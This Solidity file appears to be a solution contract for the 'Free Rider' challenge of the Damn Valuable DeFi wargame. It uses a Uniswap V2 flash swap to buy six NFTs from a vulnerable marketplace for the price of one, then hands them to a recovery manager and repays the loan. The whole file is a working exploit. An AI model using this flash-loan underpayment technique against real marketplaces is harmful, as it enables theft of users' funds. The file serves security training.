// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;


import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderAttacker is IERC721Receiver{
    WETH weth;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    address owner;

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;


    constructor(
        WETH _weth,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager
    ) payable {
        weth = _weth;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;

        owner = msg.sender;
    }

    function attack() public {
        uniswapPair.swap(NFT_PRICE, 0, address(this), new bytes(1));

        payable(owner).transfer(address(this).balance);
    }

    function uniswapV2Call(
        address /*sender*/,
        uint amount0,
        uint /*amount1*/,
        bytes calldata /*data*/
    ) external {

        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint i = 0; i < ids.length; ++i) {
            ids[i] = i;
        }
        weth.withdraw(weth.balanceOf(address(this)));
        marketplace.buyMany{value: NFT_PRICE}(ids);

        for (uint i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(address(this),address(recoveryManager), i, abi.encodePacked(bytes32(uint256(uint160(owner)))));
        }


        uint amountRequired = amount0 + 1 ether;
        weth.deposit{value: amountRequired}();
        assert(weth.transfer(msg.sender, amountRequired)); // return WETH to V2 pair
    }

    function onERC721Received(
        address,
        address,
        uint256 /*_tokenId*/,
        bytes memory /*_data*/
    ) external       pure
returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}